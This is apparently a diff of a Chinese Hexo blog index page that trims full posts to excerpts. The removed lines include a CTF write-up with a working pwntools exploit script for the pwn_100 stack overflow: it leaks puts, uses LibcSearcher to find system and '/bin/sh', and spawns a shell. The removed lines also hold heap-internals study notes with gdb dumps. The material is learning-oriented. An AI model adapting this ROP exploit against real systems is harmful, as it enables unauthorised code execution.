@@ -289,15 +289,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>我们都知道，很多时候，我们做pwn题出题者是不会给我们libc文件的，这时候，我们就需要通过各种方法来获得libc的版本，libc的基址等。这时候我们首先想到的就是泄露一个函数的真实地址。这时候，我们就可以来查找我们需要的libc版本以及偏移。在以前，获取一个函数地址之后我们就可以在libc.database网站上直接查找libc版本等信息，但现在这个网站好像不行了，所以我们现在只能通过LibcSearcher库或者pwntools的DynELF来做题。</p>
-<h2 id="LibcSearcher的基本用法"><a href="#LibcSearcher的基本用法" class="headerlink" title="LibcSearcher的基本用法"></a>LibcSearcher的基本用法</h2><p>LibcSearcher库的使用方法是非常简单的，只需要我们泄露出一个函数的真实地址之后，就可以利用这个库自带的工具来得出offset<br>了。具体代码大体如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = LibcSearcher(&apos;puts&apos;,putsaddr) </span><br><span class="line">libc_base = putsaddr - obj.dump(&apos;puts&apos;) //算出libc基地址</span><br><span class="line">system = libc_base+obj.dump(&apos;system&apos;)   //算出各函数的真实地址</span><br><span class="line">bins = libc_base+obj.dump(&apos;str_bin_sh&apos;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h2><p>这里我们用攻防世界中的pwn_100这道题来实操一下。<br>这道题是一道非常基础的栈溢出题，是一个64位程序，开启了nx防护。<br>用ida看一下源码<br><img src="/img/pwn_100_1.jpg" alt="avatar"><br><img src="/img/pwn_100_2.jpg" alt="avatar"><br>从这里很容易找出栈溢出漏洞。直接给出脚本吧：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./pwn100&apos;)</span><br><span class="line">e = ELF(&apos;./pwn100&apos;)</span><br><span class="line">puts_plt = e.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">pop_rdi = 0x400763</span><br><span class="line">pop_rsi = 0x400761</span><br><span class="line">start = 0x400550</span><br><span class="line">payload = &apos;a&apos;*0x48+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)</span><br><span class="line">payload = payload.ljust(200,&apos;a&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;~\n&apos;)</span><br><span class="line">putsaddr=u64(p.recv()[-7:-1].ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(putsaddr)</span><br><span class="line">obj = LibcSearcher(&apos;puts&apos;,putsaddr)</span><br><span class="line">libc_base = putsaddr - obj.dump(&apos;puts&apos;)</span><br><span class="line">system = libc_base+obj.dump(&apos;system&apos;)</span><br><span class="line">bins = libc_base+obj.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">payload1 = &apos;a&apos;*0x47 + p64(pop_rdi)+p64(bins)+p64(system)+p64(0xdeadbeef).ljust(200,&apos;a&apos;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">#print(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这样就十分好理解LibcSearcher这个工具了吧，功能强大，使用方便。</p>
-
+              <p>我们都知道，很多时候，我们做pwn题出题者是不会给我们libc文件的，这时候，我们就需要通过各种方法来获得libc的版本，libc的基址等。这时候我们首先想到的就是泄露一个函数的真实地址。这时候，我们就可以来查找我们需要的libc版本以及偏移。在以前，获取一个函数地址之后我们就可以在libc.database网站上直接查找libc版本等信息，但现在这个网站好像不行了，所以我们现在只能通过LibcSearcher库或者pwntools的DynELF来做题。</p>
+          
       
     </div>
     
@@ -310,6 +303,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2019/07/27/使用LibcSearcher解题/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -356,49 +353,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>正式开始学习heap的第一天，简单的在自己的博客里记录一下，当做自己的学习笔记。</p>
-<ul>
-<li>在linux的堆学习中，我们主要学习的就是malloc，relloc和free三个函数。</li>
-<li>要知道：<br>  有哪些位置的记忆体是可以被分配的<br>  有哪些是因为被free掉而可以被回收的<br>  有哪些是使用中不需要记录，使用他们的人应该记住这些指标（heap本身并不会记录）</li>
-<li>整个heap的资料记录在一个struct malloc_state中，名为main_arena<br>malloc分配的记忆体名为chunk，会比要求的大小要大一点，因为需要记录一些额外的data<br>Arena跟heap分配的记忆体分开存放，heap overflow没办法直接覆盖掉他的内容</li>
-<li>回收的chunk用linked list记录，名为bin</li>
-<li>main_arena中有很多bin，每个bin里储存的chunk size不同，目的是让malloc时可以尽快找到最适合大小的chunk</li>
-<li>回收的chunk会依据size来决定应该放哪个linked list(bin)中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main_arena&#123;</span><br><span class="line">	bin[0](size = 16) -&gt; chunk1 -&gt; chunk5</span><br><span class="line">	bin[1](size = 32) -&gt; chunk2 -&gt; chunk3 -&gt; chunk4</span><br><span class="line">	bin[2](size = 48) -&gt; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h2 id="基本内容"><a href="#基本内容" class="headerlink" title="基本内容"></a>基本内容</h2><p>然后我们可以自己编写一个heap.c来看heap的操作会发生什么事情。<br>首先我们进入gdb进行调试，将断点断在main，跑起来，输入p main_arena 就可以看到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$1 = &#123;</span><br><span class="line">  mutex = 0x0, </span><br><span class="line">  flags = 0x0, </span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  top = 0x0, </span><br><span class="line">  last_remainder = 0x0, </span><br><span class="line">  bins = &#123;0x0 &lt;repeats 254 times&gt;&#125;, </span><br><span class="line">  binmap = &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">  next = 0x7ffff7dd1b20 &lt;main_arena&gt;, </span><br><span class="line">  next_free = 0x0, </span><br><span class="line">  attached_threads = 0x1, </span><br><span class="line">  system_mem = 0x0, </span><br><span class="line">  max_system_mem = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后，我们可以使用p main_arena.bins [0]命令来查看bin[0]的内容，同时通过vmmap命令可以看到，在本程序中heap的起始位置<br>在0x602000，使用x/40gx 0x602000就可以查看堆中的内容了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x602000:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x602010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020a0:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x6020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602130:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
-
-<p>这就是两个chunk的内容，之后还会提到<strong>top chunk</strong>的内容，以后再学习吧。</p>
-<h2 id="chunk的知识"><a href="#chunk的知识" class="headerlink" title="chunk的知识"></a>chunk的知识</h2><p>存放chunk metadata的chunk结构(header):</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_chunk&#123;</span><br><span class="line">	size_t prev_size;</span><br><span class="line">	size_t size;</span><br><span class="line">	malloc_chunk* fd;//当chunk处于inuse状态的时候fd和bk是不需要的，就用来放userdata</span><br><span class="line">	malloc_chunk* bk;</span><br><span class="line">	malloc_chunk* fd_nextsize;</span><br><span class="line">	malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>(64bit):mem = malloc(size)<br>-&gt; chunk = mem - 16(32bit则是8);chunksize = (size+8)#16 </p>
-<ul>
-<li>实际chunk地址是malloc得到的地址减去16</li>
-<li>chunksize是size+8后向上对齐到16的倍数，因为要存放额外的资料</li>
-</ul>
-<p>下面我们看一看chunk在被使用的条件之下，结构是什么样子的。<br><img src="/img/inuse.jpg" alt="avatar"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">	void *p,*q;</span><br><span class="line">	p = malloc(152);</span><br><span class="line">	q = malloc(10);</span><br><span class="line">	memset(p,&apos;A&apos;,152);</span><br><span class="line">	free(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在如上代码的情况下，我们输入x/36gx 0x602000查看堆中布局，会看到如下代码：<br><img src="/img/chunk.jpg" alt="avatar"><br>从这里我们就可以知道，为什么chunksize需要+8，因为我们可以覆盖到下一个chunk的前8个bit<br>再看not inuse时的情况：<br><img src="/img/noinuse.jpg" alt="avatar"><br>在把p释放掉以后</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/36gx 0x602000</span><br><span class="line">0x602000:	0x0000000000000000	0x00000000000000a1</span><br><span class="line">0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78//fd和bk</span><br><span class="line">0x602020:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x602030:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x602040:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x602050:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x602060:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x602070:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x602080:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x602090:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x6020a0:	0x00000000000000a0	0x0000000000000020//这里a0就是prev_size，如果我这个chunk正在使用，就不需要</span><br><span class="line">0x6020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0:	0x0000000000000000	0x0000000000020f41</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
-
-<h3 id="chunk的栏位"><a href="#chunk的栏位" class="headerlink" title="chunk的栏位"></a>chunk的栏位</h3><ul>
-<li>size:这个chunk在记忆体里的大小</li>
-<li>fd，bk：指向bin里前一、后一个chunk(一般来说，bin是double linked list)</li>
-<li>prev_size：前一个chunk的size，</li>
-</ul>
-<p>这种情况之下，每个chunk可以看到相邻的4个chunk：</p>
-<ul>
-<li>下一个chunk是chunk+size</li>
-<li>前一个chunk是chunk-prev_size</li>
-</ul>
-<h3 id="size的栏位"><a href="#size的栏位" class="headerlink" title="size的栏位"></a>size的栏位</h3>
+              <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>正式开始学习heap的第一天，简单的在自己的博客里记录一下，当做自己的学习笔记。</p>
+          
       
     </div>
     
@@ -411,6 +367,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2019/07/21/heap-1/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -457,8 +417,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>人生第一次搭建博客<br><img src="/img/1.jpg" alt="avatar"></p>
-
+              <p>人生第一次搭建博客</p>
+          
       
     </div>
     
@@ -471,6 +431,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/大事/">大事</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2019/07/17/My-Blog/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -517,20 +481,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
+              <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+          
       
     </div>
     
@@ -539,6 +491,10 @@
       
 
       
+      
+        <p class="article-more-link">
+          <a href="/2019/07/17/hello-world/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
